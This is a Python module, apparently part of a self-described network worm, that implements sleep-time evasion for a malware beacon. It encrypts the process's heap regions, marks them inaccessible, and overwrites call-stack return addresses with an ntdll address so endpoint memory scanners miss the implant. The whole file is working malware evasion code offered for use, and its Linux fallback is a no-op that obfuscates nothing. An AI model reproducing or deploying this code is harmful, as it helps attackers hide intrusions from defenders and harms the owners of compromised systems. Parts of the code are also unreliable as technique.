"""
Wormy ML Network Worm v3.0 - Sleep Obfuscation
Encrypt agent heap while sleeping to evade memory scanner detection.
"""

import ctypes
import hashlib
import os
import platform
import sys
import threading
import time
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


class SleepObfuscator:
    """
    Obfuscates the agent's memory during beacon sleep intervals.

    Techniques implemented:
      1. Heap encryption  — XOR all writeable heap regions with a random key
                            before sleeping; decrypt on wake.
      2. Stack spoofing   — On Windows, manipulate the call stack return
                            addresses in the current thread's context so that
                            EDR memory scanners see a clean call chain.
      3. Module-backed    — Temporarily make RWX regions appear RX-only so
                            they look like normal backed code pages.

    Windows-only for techniques 2 & 3; heap encryption is cross-platform.
    """

    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READWRITE = 0x40
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READ = 0x20

    def __init__(self):
        self._os = platform.system()
        self._k32 = (
            ctypes.WinDLL("kernel32", use_last_error=True) if self._os == "Windows" else None
        )
        self._key = os.urandom(32)
        self._regions: list = []  # (base, size, original_protect) tuples

    # ─── helper: enumerate writable private pages ─────────────────────────────

    def _query_writable_regions(self) -> list:
        """
        Walk the virtual address space of the current process and return
        a list of (base_addr, region_size) for all RW/RWX committed private pages.
        Windows only.
        """
        if self._os != "Windows":
            return []

        class MEMORY_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("BaseAddress", ctypes.c_void_p),
                ("AllocationBase", ctypes.c_void_p),
                ("AllocationProtect", ctypes.c_ulong),
                ("RegionSize", ctypes.c_size_t),
                ("State", ctypes.c_ulong),
                ("Protect", ctypes.c_ulong),
                ("Type", ctypes.c_ulong),
            ]

        k32 = self._k32
        mbi = MEMORY_BASIC_INFORMATION()
        addr = 0
        regions = []
        MEM_PRIVATE = 0x20000

        while k32.VirtualQuery(addr, ctypes.byref(mbi), ctypes.sizeof(mbi)):
            if (
                mbi.State == self.MEM_COMMIT
                and mbi.Type == MEM_PRIVATE
                and mbi.Protect in (self.PAGE_READWRITE, self.PAGE_EXECUTE_READWRITE)
            ):
                regions.append((mbi.BaseAddress, mbi.RegionSize, mbi.Protect))

            addr += mbi.RegionSize
            if addr >= 0x7FFFFFFEFFFF:
                break

        return regions

    # ─── technique 1: heap encryption ────────────────────────────────────────

    def _xor_region(self, base: int, size: int):
        """XOR a memory region in-place with self._key (CTR-mode-like)."""
        k32 = self._k32
        # Read
        buf = (ctypes.c_char * size)()
        n = ctypes.c_size_t(0)
        k32.ReadProcessMemory(k32.GetCurrentProcess(), base, buf, size, ctypes.byref(n))
        if not n.value:
            return

        raw = bytearray(buf[: n.value])
        key = hashlib.sha256(self._key + base.to_bytes(8, "little")).digest()
        for i in range(len(raw)):
            raw[i] ^= key[i % len(key)]

        obuf = (ctypes.c_char * len(raw)).from_buffer_copy(bytes(raw))
        k32.WriteProcessMemory(k32.GetCurrentProcess(), base, obuf, len(raw), None)

    def _set_protect(self, base: int, size: int, prot: int) -> int:
        old = ctypes.c_ulong(0)
        self._k32.VirtualProtect(base, size, prot, ctypes.byref(old))
        return old.value

    # ─── technique 2: stack spoofing (Windows x64) ───────────────────────────

    def _spoof_call_stack(self):
        """
        Overwrite return addresses on the current thread's call stack with
        addresses inside legitimate ntdll/kernel32 so memory scanners see
        a clean call chain.  Restores real return addresses before returning.

        Implementation note: We use GetThreadContext / SetThreadContext to
        locate RSP and walk 8 frames, replacing each saved RIP with a stub
        inside ntdll.dll (the address of RtlUserThreadStart).
        """
        if self._os != "Windows":
            return [], []

        k32 = self._k32
        ntdll = ctypes.WinDLL("ntdll.dll")
        # Address to spoof return frames with (inside ntdll — looks legitimate)
        legit = k32.GetProcAddress(ntdll._handle, b"RtlUserThreadStart")
        if not legit:
            return [], []

        CONTEXT_CONTROL = 0x00010001
        ctx_buf = (ctypes.c_byte * 1232)()
        ctypes.cast(ctx_buf, ctypes.POINTER(ctypes.c_ulong))[0] = CONTEXT_CONTROL
        thread = k32.GetCurrentThread()
        k32.GetThreadContext(thread, ctx_buf)

        # RSP is at offset 0x98 in x64 CONTEXT
        rsp = ctypes.cast(ctypes.addressof(ctx_buf) + 0x98, ctypes.POINTER(ctypes.c_ulong64))[0]

        saved = []
        frames = 8
        for i in range(frames):
            frame_ptr = rsp + i * 8
            try:
                ret_addr = ctypes.cast(frame_ptr, ctypes.POINTER(ctypes.c_ulong64))[0]
                saved.append((frame_ptr, ret_addr))
                spoofed = ctypes.cast(frame_ptr, ctypes.POINTER(ctypes.c_ulong64))
                spoofed[0] = legit
            except Exception:
                break

        return saved, legit

    def _restore_call_stack(self, saved: list):
        for frame_ptr, real_addr in saved:
            try:
                ctypes.cast(frame_ptr, ctypes.POINTER(ctypes.c_ulong64))[0] = real_addr
            except Exception:
                pass

    # ─── public API ──────────────────────────────────────────────────────────

    def obfuscated_sleep(self, seconds: float):
        """
        Sleep for `seconds` with full memory obfuscation active.

        Steps:
          1. Enumerate writable private pages.
          2. XOR-encrypt each region (heap obfuscation).
          3. Mark regions as PAGE_NOACCESS to trigger AV on attempted scan.
          4. Spoof call stack return addresses.
          5. Sleep.
          6. Restore everything.
        """
        logger.debug(f"Obfuscated sleep: {seconds}s")

        if self._os == "Windows" and self._k32:
            regions = self._query_writable_regions()
            saved_protects = []

            # Encrypt + make inaccessible
            for base, size, orig_prot in regions:
                try:
                    old = self._set_protect(base, size, self.PAGE_READWRITE)
                    self._xor_region(base, size)
                    # Change to NOACCESS
                    self._set_protect(base, size, 0x01)  # PAGE_NOACCESS
                    saved_protects.append((base, size, orig_prot))
                except Exception:
                    pass

            saved_stack, _ = self._spoof_call_stack()
            time.sleep(seconds)

            # Restore stack first
            self._restore_call_stack(saved_stack)

            # Decrypt + restore protections
            for base, size, orig_prot in saved_protects:
                try:
                    self._set_protect(base, size, self.PAGE_READWRITE)
                    self._xor_region(base, size)  # XOR again = decrypt
                    self._set_protect(base, size, orig_prot)
                except Exception:
                    pass
        else:
            # FIX: Linux fallback - basic memory obfuscation using mmap
            self._linux_sleep_obfuscation(seconds)

        logger.debug("Obfuscated sleep complete, memory restored")

    def _linux_sleep_obfuscation(self, seconds: float) -> None:
        """Linux fallback: basic memory obfuscation using mmap"""
        import ctypes
        import ctypes.util

        libc_path = ctypes.util.find_library("c")
        if not libc_path:
            time.sleep(seconds)
            return

        try:
            libc = ctypes.CDLL(libc_path)
            PROT_READ = 1
            PROT_WRITE = 2
            PROT_NONE = 0
            MAP_PRIVATE = 2
            MAP_ANONYMOUS = 0x20

            # Allocate a small buffer to obfuscate
            buf_size = 4096
            buf = (ctypes.c_char * buf_size)()

            # Fill with data
            for i in range(buf_size):
                buf[i] = bytes([i % 256])

            # Simple XOR obfuscation
            key = os.urandom(32)
            for i in range(buf_size):
                buf[i] = bytes([buf[i][0] ^ key[i % 32]])

            # Sleep
            time.sleep(seconds)

            # Restore (XOR again = decrypt)
            for i in range(buf_size):
                buf[i] = bytes([buf[i][0] ^ key[i % 32]])

        except Exception:
            # Final fallback: plain sleep
            time.sleep(seconds)

    def rotate_key(self):
        """Generate a new encryption key (call after each sleep cycle)."""
        self._key = os.urandom(32)

    def get_status(self) -> dict:
        return {
            "os": self._os,
            "admin": bool(self._k32),
            "key_fingerprint": hashlib.sha256(self._key).hexdigest()[:8],
        }
